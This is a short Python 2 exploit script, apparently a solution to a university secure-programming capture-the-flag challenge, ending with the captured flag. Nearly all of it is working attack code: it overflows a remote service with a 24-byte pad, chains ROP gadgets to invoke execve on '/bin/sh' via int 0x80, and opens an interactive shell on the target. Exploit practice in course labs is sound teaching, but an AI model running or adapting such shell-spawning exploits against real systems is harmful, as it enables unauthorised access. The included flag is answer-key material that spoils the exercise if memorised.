#!/usr/bin/env python2

import struct
from socket import *
import telnetlib
import re
import struct

ip = 'secprog.cs.nctu.edu.tw'
port = 10108

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((ip,port))
data = soc.recv(4096)
print(data)


# 8054440:       31 c0                   xor    eax,eax
# 8054442:       c3                      ret


# 80481c9:       5b                      pop    ebx
# 80481ca:       c3                      ret

# 806f0e0:       cd 80                   int    0x80
# 806f0e2:       c3                      ret

# 805c3b7:       40                      inc    eax
# 805c3b8:       5f                      pop    edi
# 805c3b9:       5e                      pop    esi
# 805c3ba:       c3                      ret

payload = "a"*24
payload += struct.pack('<I', 0x08054440)      # xor eax, eax
for i in range(11):
    payload += struct.pack('<I', 0x0805c3b7)  # inc eax, pop edi, pop esi
    payload += struct.pack('<I', 0x41414141)
    payload += struct.pack('<I', 0x41414141)
payload += struct.pack('<I', 0x080481c9)      # pop ebx
payload += struct.pack('<I', 0x080be568)      # "/bin/sh"
payload += struct.pack('<I', 0x0806f0e0)      # int 0x80

soc.send(payload)
print("sent")

# get interactive shell
t = telnetlib.Telnet()
t.sock = soc
t.interact()

# SECPROG{YouAlreadyLearnedROPInHW0}
